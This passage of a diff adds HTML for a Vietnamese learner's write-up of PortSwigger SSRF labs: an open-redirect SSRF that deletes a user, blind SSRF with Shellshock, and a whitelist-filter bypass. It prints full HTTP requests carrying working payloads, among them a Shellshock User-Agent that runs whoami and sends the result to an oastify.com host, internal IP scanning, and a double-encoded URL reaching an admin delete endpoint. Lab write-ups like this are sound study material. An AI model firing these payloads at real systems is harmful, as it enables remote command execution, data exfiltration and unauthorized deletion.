+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a17000a04f9870f804508a600c70079</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">Z6QXpmFlUCLU76pQhcVv7S2IG5KIZndN</span><span class="p">;</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">ckjOiTht2pmcFMEXKBJ1o0ivP4XZcNhW</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a17000a04f9870f804508a600c70079.web-security-academy.net/product?productId=2</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">106</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a17000a04f9870f804508a600c70079.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">stockApi</span><span class="o">=%</span><span class="mf">2</span><span class="nx">fproduct</span><span class="o">%</span><span class="mf">2</span><span class="nx">fnextProduct</span><span class="o">%</span><span class="mf">3</span><span class="nx">fcurrentProductId</span><span class="o">%</span><span class="mf">3</span><span class="nx">d1</span><span class="o">%</span><span class="mf">26</span><span class="nx">path</span><span class="o">%</span><span class="mf">3</span><span class="nx">dhttp</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">f192</span><span class="mf">.168.0.12</span><span class="o">%</span><span class="mf">3</span><span class="nx">a8080</span><span class="o">%</span><span class="mf">2</span><span class="nx">fadmin</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi path xóa và xóa thành công user <code>carlos</code> . Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-ssrf-with-shellshock-exploitation"><strong>Lab: Blind SSRF with Shellshock exploitation</strong><a class="headerlink" href="#lab-blind-ssrf-with-shellshock-exploitation" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">Lab: Blind SSRF with Shellshock exploitation | Web Security Academy</a></p>
+<ul>
+<li>Bài này em xem solution ở phần có shellshock ở service nội bộ và do parse header <code>User-Agent</code> gây ra ạ.</li>
+<li>
+<p>Thực hiện truy cập một món hàng bất kỳ.</p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>GET /product?productId=&lt;id&gt;</code> .</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">?</span><span class="nx">productId</span><span class="o">=</span><span class="mf">1</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a8000ec0379e4bf82afd9e5006c002a</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">y2hojVp7P33CsPfmKKUg6q9Yl6EjIFuB</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">:</span><span class="p">;</span><span class="w"> </span><span class="p">};</span><span class="w"> </span><span class="err">/usr/bin/nslookup $(whoami).i7qu3npfwbi97jhd78xmwg726tck0cr0g.oastify.com</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.0.0:8080</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Tiếp tục, thực hiện gửi request trên với header là đến domain của Burpcollab</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">?</span><span class="nx">productId</span><span class="o">=</span><span class="mf">1</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a8000ec0379e4bf82afd9e5006c002a</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">y2hojVp7P33CsPfmKKUg6q9Yl6EjIFuB</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//q5w21vnnujgh5rfl5gvuuo5a41asyj37s.oastify.com</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Từ bước trước, chúng ta nhận thấy rằng có một request sẽ được gửi tiếp và lại lấy cả useragent của chúng ta gửi đề. Kết hợp với đề cho rằng có một service nội bộ có lỗi shellshock.</p>
+</li>
+<li>
+<p>Thực hiện thêm payload sau vào header <code>User-agent</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">:</span><span class="p">;</span><span class="w"> </span><span class="p">};</span><span class="w"> </span><span class="err">/usr/bin/nslookup $(whoami).i7qu3npfwbi97jhd78xmwg726tck0cr0g.oastify.com</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thay đổi header <code>Referer</code> thành địa chỉ ip nội bộ.</p>
+<div class="highlight"><pre><span></span><code><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.0.$0$:8080</span>
+</code></pre></div>
+</li>
+<li>
+<p>Chuyển request đã sửa sang tab <code>Intruder</code> và thực hiện quét như sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">?</span><span class="nx">productId</span><span class="o">=</span><span class="mf">1</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a8000ec0379e4bf82afd9e5006c002a</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">y2hojVp7P33CsPfmKKUg6q9Yl6EjIFuB</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">:</span><span class="p">;</span><span class="w"> </span><span class="p">};</span><span class="w"> </span><span class="err">/usr/bin/nslookup $(whoami).i7qu3npfwbi97jhd78xmwg726tck0cr0g.oastify.com</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.0.0:8080</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+</code></pre></div>
+</li>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát Burpcollab được trigger. Nhận được OS username</p>
+<ul>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2034.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Submit kết quả và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+</ul>
+<h1 id="lab-ssrf-with-whitelist-based-input-filter"><strong>Lab: SSRF with whitelist-based input filter</strong><a class="headerlink" href="#lab-ssrf-with-whitelist-based-input-filter" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter">Lab: SSRF with whitelist-based input filter | Web Security Academy</a></p>
+<ul>
+<li>Chỗ này, em gọi được trang nội bộ rồi nhưng mà response trả về là trang chủ, không vào được admin panel dù có path trong response rồi → em xem solution thì do phần path em để trước <code>@</code> . Em thực hiện để lại path ở cuối cùng thì được ạ.</li>
+<li>
+<p>Truy cập vào một sản phẩm và kiểm tra số lượng hàng tồn kho sản phẩm ấy.</p>
+<p><img alt="image.png" src="image%2036.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt và chuyển request gửi tới API <code>POST /product/stock</code> sang tab <code>Repeater</code></p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a50004a03d5fa49802e17930036002d</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">sG4EwlddbA7O8r0sUsLASHlVAHg6PC67</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">stockApi</span><span class="o">=</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">flocalhost</span><span class="o">%</span><span class="mf">2523</span><span class="o">%</span><span class="mf">3</span><span class="nx">a11</span><span class="o">%</span><span class="mf">40</span><span class="nx">stock</span><span class="p">.</span><span class="nx">weliketoshop</span><span class="p">.</span><span class="nx">net</span><span class="o">%</span><span class="mf">3</span><span class="nx">a8080</span><span class="o">%</span><span class="mf">2</span><span class="nx">fadmin</span><span class="o">%</span><span class="mf">2</span><span class="nx">fdelete</span><span class="o">%</span><span class="mf">3</span><span class="nx">fusername</span><span class="o">%</span><span class="mf">3</span><span class="nx">dcarlos</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Tại đây, nhận thấy rằng code đã validate tên miền buộc phải là <a href="http://stock.weliketoshop.net/"><code>stock.weliketoshop.net</code></a> nếu không sẽ bị lỗi</p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+<li>
+<p>Thực hiện sử dụng encode 2 lần vì khả năng lần đầu khi nhận raw input và parse để validate sẽ không thể ra hết ký tự cho đến khi fetch thì sẽ có khả năng decode lần nữa.</p>
+<ul>
+<li>
+<p>Double encoding <code>#</code></p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+</li>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">flocalhost</span><span class="o">%</span><span class="mf">2523</span><span class="o">%</span><span class="mf">3</span><span class="nx">a11</span><span class="o">%</span><span class="mf">40</span><span class="nx">stock</span><span class="p">.</span><span class="nx">weliketoshop</span><span class="p">.</span><span class="nx">net</span><span class="o">%</span><span class="mf">3</span><span class="nx">a8080</span><span class="o">%</span><span class="mf">2</span><span class="nx">fadmin</span><span class="o">%</span><span class="mf">2</span><span class="nx">fdelete</span><span class="o">%</span><span class="mf">3</span><span class="nx">fusername</span><span class="o">%</span><span class="mf">3</span><span class="nx">dcarlos</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request và response trả về admin panel</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a50004a03d5fa49802e17930036002d</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">sG4EwlddbA7O8r0sUsLASHlVAHg6PC67</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">stockApi</span><span class="o">=</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">flocalhost</span><span class="o">%</span><span class="mf">2523</span><span class="o">%</span><span class="mf">3</span><span class="nx">a11</span><span class="o">%</span><span class="mf">40</span><span class="nx">stock</span><span class="p">.</span><span class="nx">weliketoshop</span><span class="p">.</span><span class="nx">net</span><span class="o">%</span><span class="mf">3</span><span class="nx">a8080</span><span class="o">%</span><span class="mf">2</span><span class="nx">fadmin</span><span class="o">%</span><span class="mf">2</span><span class="nx">fdelete</span><span class="o">%</span><span class="mf">3</span><span class="nx">fusername</span><span class="o">%</span><span class="mf">3</span><span class="nx">dcarlos</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện xóa user <code>carlos</code> . Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Request</p>
